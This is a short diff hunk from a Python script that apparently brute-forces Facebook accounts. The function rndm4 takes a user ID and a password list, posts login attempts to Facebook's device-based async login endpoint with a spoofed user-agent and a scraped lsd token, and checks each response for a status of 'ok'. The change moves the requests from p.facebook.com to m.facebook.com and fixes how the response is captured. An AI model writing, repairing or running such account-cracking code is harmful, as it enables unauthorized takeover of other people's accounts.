@@ -1371,7 +1371,7 @@ def rndm4(uid,passlist):
 'user-agent': au,
 'x-asbd-id': '129477',
 'x-fb-lsd':re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1)}
-                        session.post(f'https://p.facebook.com/login/device-based/login/async/',data=data,headers=headers).text
+                        response = session.post(f'https://m.facebook.com/login/device-based/login/async/',data=data,headers=headers)
                         if response.status_code == 200:
                            json_response = response.json()
                            if json_response.get('status') == 'ok':
